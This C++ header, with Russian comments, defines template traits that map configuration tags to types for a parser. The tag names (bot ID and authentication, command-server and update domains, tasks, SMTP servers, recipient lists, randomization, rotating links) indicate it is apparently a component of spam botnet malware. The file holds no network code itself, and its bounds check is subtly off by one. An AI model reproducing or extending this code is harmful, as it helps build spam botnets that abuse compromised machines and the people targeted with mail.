//------------------------------------------------------------
//     ’ЁЇл внЈ®ў
//------------------------------------------------------------
#ifndef Tag_TypesH
#define Tag_TypesH
#include <typeinfo>
#include <string>
#include <list>
#include <map>
#include "manipulators.h"
#include "convertors.h"
#include "type_decl.h"
namespace Parser
{
  extern  const int    tags_count;
  extern  const char   *tags_argv[tags_count];
  extern  const char   *tags_argv_fini[tags_count];
  extern  unsigned int is_sub_type[tags_count+1];

  template
  <
    typename T
  >
  struct multi_traits
  {
	  typedef T getType;
  	enum{DATA_ID = type_tags::MULTIPLE};
    //-------------------------------------------
  	inline
	  static
    typename T::value_type 
    convert(const char *str) 
	  {
		  return (tag_convertors::tag_convertor_
        <typename T::value_type >::convert(str));
	  }
    //-------------------------------------------  
  };

  template 
  <
    typename T
  >
  struct	counted_traits
  {     
    typedef T  getType;
	  typedef std::pair<
      typename T::value_type::first_type,
      typename T::value_type::second_type
    > getPair;
	  enum{DATA_ID = type_tags::COUNTED};
    //-------------------------------------------
  	inline
	  static
	  std::string 
    convert(const char *str) 
	  {
      return (
        manip::sym_manipulator  ( std::string("##BR") , std::string("\r\n") )
        (
          tag_convertors::tag_convertor_
          <
            typename T::value_type::second_type
          >::convert(str)
        )
      );
	  }
  };
  
  template 
  <
    typename T
  >
  struct	single_traits
  { 
    public: 
   	enum{DATA_ID = type_tags::SINGLE};
   	typedef T getType;
   //-------------------------------------------  
    const 
	  static
	  getType 
	  convert(const char *str)
    {
      return (tag_convertors::
        tag_convertor_<getType>::convert(str));
    }
   //-------------------------------------------  
  };
//
//	
  template <int type_id>
  struct	getTypeById
    :public single_traits<cnull>
  { 
  };
//
//	
  template <>
  struct	getTypeById<type_tags::NONE>
    :public single_traits< std::string >
  { 
  };
//
//	
  template <>
  struct	getTypeById<type_tags::TID>
    :public single_traits< long >
  {     
  };
//
//	
  template <>
  struct	getTypeById<type_tags::THREADS>
    :public single_traits< long >
  {     
  };
//
//	
  template <>
  struct	getTypeById<type_tags::RANDOMIZATION_LEVEL>
    :public single_traits< long >
  {     
  };
//
//	
  template <>
  struct	getTypeById<type_tags::TIMEOUT_SEND_RECV>
    :public single_traits< int >
  {     
  };
//
//
 template <>
 struct	getTypeById<type_tags::MX_BAD_COUNT>
   :public single_traits< int >
 {     
 };  
//
//	
 template <>
 struct	getTypeById<type_tags::SLEEP>
   :public single_traits< int >
 {     
 };
//
//	
  template <>
  struct	getTypeById<type_tags::MX_CACHE>
    :public single_traits< std::string >
  {     
  };
//
//	
  template <>
  struct	getTypeById<type_tags::CHARSET>
    :public single_traits< std::string >
  {     
  };
//
//	
  template <>
  struct	getTypeById<type_tags::REPORT_FREQUENCY>
    :public single_traits< long >
  {     
  };
//
//	
  template <>
  struct	getTypeById<type_tags::LETTER_FORMAT>
    :public single_traits< std::string >
  {     
  };
//
//
  template <>
  struct	getTypeById<type_tags::MAIL_FROM>
    :public multi_traits< 
    std::list< std::string > 
    >
  { 
  };
//
//
  template <>
  struct	getTypeById<type_tags::LINKS_ROTATE_LIST>
    :public multi_traits< 
    std::list< std::string > 
    >
  { 
  };
//
//
  template <>
  struct	getTypeById<type_tags::HEADER_MAIL_MACROS>
     :public multi_traits< 
     std::list< std::string > 
     >
  {     
    inline
    static
    std::string 
    convert(const char *str) 
    {
      return 
        (
          manip::sym_manipulator  ( std::string("##BR") , std::string("\r\n") )
          (
            tag_convertors::tag_convertor_<
              std::string
            >::convert(str)
          )       
        );
    }
    //-------------------------------------------  
  };
//
//
 template <>
  struct	getTypeById<type_tags::BODY_MAIL_MACROS>
     :public multi_traits< 
     std::list< std::string > 
     >
  {     
    //-------------------------------------------
    inline
    static
    std::string 
    convert(const char *str) 
    {
      return 
        (
          manip::sym_manipulator  ( std::string("##BR") , std::string("\r\n") )
          (
            tag_convertors::tag_convertor_<std::string>::convert(str)
          )      
        );
    }
    //-------------------------------------------  
  };
//
//
  template <>
  struct	getTypeById<type_tags::SMTP_SERVERS>
  :public multi_traits< 
                 std::multimap< std::string , 
                 tag_convertors::smtp_tuples >
          >
  {     
   //-------------------------------------------
  	inline
	  static
    tag_convertors::smtp_strategy::type_pair
    convert(const char *str) 
	  {
		  return (tag_convertors::tag_convertor_<
        tag_convertors::smtp_strategy::type_pair
                                        >::convert(str));
	  }
   //-------------------------------------------  
  };
//
//
  template <>
  struct	getTypeById<type_tags::MAIL_TO>
   :public multi_traits< 
	    std::list
       <
         tag_convertors::
         mail_to_strategy::
         type_pair
       >
     >
  {     
    //-------------------------------------------
  	inline
	  static
    tag_convertors::
  	mail_to_strategy::
    type_pair
    convert(const char *str) 
	  {
		  return (tag_convertors::tag_convertor_
        <
        tag_convertors::
        mail_to_strategy::type_pair
        >::convert(str));
	  }
    //-------------------------------------------  
  };
//
//
  template <>
  struct	getTypeById<type_tags::BODY>
    :public counted_traits<
      std::multimap<long,std::string> 
    >
  {     
  };
//
//
  template <>
  struct	getTypeById<type_tags::HEADER>
    :public counted_traits<
      std::multimap<long,std::string> 
    >
  {     
  };
//
//
  template <>
  struct	getTypeById<type_tags::LINKS_XCHG_COUNT>
      :public single_traits< long >
  {     
  };
//
//
  template <>
  struct	getTypeById<type_tags::BOT_ID>
      :public single_traits< long >
  {     
  };
//
//
  template <>
  struct	getTypeById<type_tags::BOT_AUTH>
    :public single_traits< std::string >
  {     
  };
//
//
  template <>
  struct	getTypeById<type_tags::HAVE_TASK>
    :public single_traits< std::string >
  {     
  };
//
//
  template <>
  struct	getTypeById<type_tags::BOT_ID_EXIST>
    :public single_traits< long >
  {     
  };
//
//
  template <>
  struct	getTypeById<type_tags::MAIL_SUBJECT>
    :public single_traits< std::string >
  {     
  };
//
//
  template <>
  struct	getTypeById<type_tags::BOT_ERROR>
    :public single_traits< std::string >
  {     
  };
//
//
  template <>
  struct	getTypeById<type_tags::BOT_SERVER_DOMAIN>
    :public single_traits< std::string >
  {     
  };
//
//
  template <>
  struct	getTypeById<type_tags::BOT_SERVER_CMD>
    :public single_traits< std::string >
  {     
  };
//
//
  template <>
  struct	getTypeById<type_tags::BOT_UPD_DOMAIN>
    :public single_traits< std::string >
  {     
  };
//
//
  template <>
  struct	getTypeById<type_tags::BOT_UPD_PATH>
    :public single_traits< std::string >
  {     
  };
// Заполняет массив свойств is_sub_type; 
  template <int instantiation_count>
  struct  init_counters
  {
    static
	  void 
	  result(void)
	  {
	    is_sub_type[instantiation_count - 1] = getTypeById<instantiation_count - 1>::DATA_ID;
	    init_counters<instantiation_count - 1>::result();
	    return ;
	  }
  };
// конец рекурсии времени компиляции.
  template <>
  struct  init_counters<type_tags::NONE>
  {
    static
	  void 
	  result(void)
	  {     
	    is_sub_type[type_tags::NONE] = getTypeById<type_tags::NONE>::DATA_ID;        
	    return ;
	  }
  };

//------------------------------------------------------------------------------
//        Реализация типов тэгов
//------------------------------------------------------------------------------
   typedef getTypeById<type_tags::NONE>              t_none;
   typedef getTypeById<type_tags::TID>               t_tid;
   typedef getTypeById<type_tags::THREADS>           t_threads;
   typedef getTypeById<type_tags::TIMEOUT_SEND_RECV> t_timeout;
   typedef getTypeById<type_tags::SLEEP>             t_sleep;
   typedef getTypeById<type_tags::MX_CACHE>          t_mxcache;
   typedef getTypeById<type_tags::REPORT_FREQUENCY>  t_rep_freq;
   typedef getTypeById<type_tags::LETTER_FORMAT>     t_letter_form;
   typedef getTypeById<type_tags::CHARSET>           t_charset; 
   typedef getTypeById<type_tags::MAIL_FROM>         t_mail_from; 
   typedef getTypeById<type_tags::MAIL_TO>           t_mail_to;
   typedef getTypeById<type_tags::SMTP_SERVERS>      t_smtp_servers;
   typedef getTypeById<type_tags::MX_BAD_COUNT>      t_mx_bad_count;
   typedef getTypeById<type_tags::HEADER_MAIL_MACROS>t_head_macros;
   typedef getTypeById<type_tags::BODY_MAIL_MACROS>  t_body_macros;
   typedef getTypeById<type_tags::BOT_ID>            t_bot_id;
   typedef getTypeById<type_tags::BOT_AUTH>          t_bot_auth;
   typedef getTypeById<type_tags::HAVE_TASK>         t_bot_task_present;
   typedef getTypeById<type_tags::BOT_ID_EXIST>      t_bot_id_exist;
   typedef getTypeById<type_tags::BOT_ERROR>         t_bot_error;
   typedef getTypeById<type_tags::BOT_SERVER_DOMAIN> t_bot_domain;
   typedef getTypeById<type_tags::BOT_SERVER_CMD>    t_bot_cmd;
   typedef getTypeById<type_tags::BOT_UPD_DOMAIN>    t_bot_upd_domain; 
   typedef getTypeById<type_tags::BOT_UPD_PATH>      t_bot_upd_cmd;
   typedef getTypeById<type_tags::MAIL_SUBJECT>      t_mail_subj; 
   typedef getTypeById<type_tags::RANDOMIZATION_LEVEL> t_rand_level;
   typedef getTypeById<type_tags::LINKS_ROTATE_LIST>   t_links_rot;
   typedef getTypeById<type_tags::LINKS_XCHG_COUNT>    t_links_xchg;
   //Счётчиковые типы тэгов
   struct t_body
   {
	   typedef getTypeById<type_tags::BODY>::getType getType;
	   typedef getTypeById<type_tags::BODY>::getPair getPair;
	   typedef getTypeById<type_tags::BODY> body;
   //------------------------------------------------------  
     static
     void
     reset(void)
     {
       count = 0;
     }
   //------------------------------------------------------  
	   static
	   const long& 
	   get_count(void)
     {
	     return ( count );
     }
   //------------------------------------------------------
	   static 
	   void 
	   inc(void)
     {
	     ++count;
     }
   //------------------------------------------------------
     private:
	  static long count; 
   };
//
//
//
   struct t_header
   {
	   typedef getTypeById<type_tags::HEADER>::getType getType;
	   typedef getTypeById<type_tags::HEADER>::getPair getPair;
	   typedef getTypeById<type_tags::HEADER> header;
   //------------------------------------------------------  
	   static
	   const long& 
	   get_count(void)
     {
	     return ( count );
     }
   //------------------------------------------------------
     static
     void
     reset(void)
     {
       count = 0;
     }  
   //------------------------------------------------------
	   static 
	   void 
	   inc(void)
     {
	     ++count;
     }
   //------------------------------------------------------
     private:
	   static long count; 
   };
	/*
     Метаданные для статического обобщения xml.
  */
   struct meta_data_type
   {
	   enum{ELEMENT_COUNT = tags_count + 1};
	   t_none::getType            none; //Несуществующий тип/
     t_tid::getType             tid;   
     t_threads::getType         threads;
     t_timeout::getType         timeout;
     t_sleep::getType           sleep;
     t_mxcache::getType         mxcache;
     t_rep_freq::getType        rep_freq;
     t_letter_form::getType     letter_form;
	   t_charset::getType         charset; 
	   t_mail_from::getType       mail_from;
	   t_mail_to::getType         mail_to;
     t_smtp_servers::getType    smtp_servers;
     t_body::getType            body;
	   t_header::getType          header;
     t_mx_bad_count::getType    mx_bad_count;
     t_head_macros::getType     head_macros;
     t_body_macros::getType     body_macros;
     t_bot_id::getType          bot_id;
     t_bot_auth::getType        bot_auth;
     t_bot_task_present::
       getType                  bot_task_present;
     t_bot_id_exist::getType    bot_id_exist;
     t_bot_error::getType       bot_error;
     t_bot_domain::getType      bot_dmn;
     t_bot_cmd::getType         bot_cmd; 
     t_bot_upd_domain::getType  bot_upd_dmn;
     t_bot_upd_cmd::getType     bot_upd_cmd;
     t_mail_subj::getType       mail_subj;
     t_rand_level::getType      rand_level; 
     t_links_rot::getType       links_rot;
     t_links_xchg::getType      links_xchg_count;
     unsigned int last_tag_id;//последний обработанный ТЭГ.
	 //по которым можно судить инициализирована ли переменная,
	 // например так init_tags[type_tags::THREADS]
//----------------------------------------------------------------
	   meta_data_type()
     {
	     init_counters<ELEMENT_COUNT>::result();
  	   memset(init_tags,0,sizeof(init_tags));
	   };
//----------------------------------------------------------------
    ~meta_data_type()
    {
      t_body::reset();
 	    t_header::reset();
    }
//----------------------------------------------------------------
    bool& 
    operator[] (unsigned int tag_id)  
	  {  
	    if (tag_id<=ELEMENT_COUNT)
		    return (init_tags[tag_id]);
	    return (init_tags[0]);
	  }
//----------------------------------------------------------------
private:
	  bool init_tags[ELEMENT_COUNT]; 
//-----------------------------------------------------------------
  };
};
#endif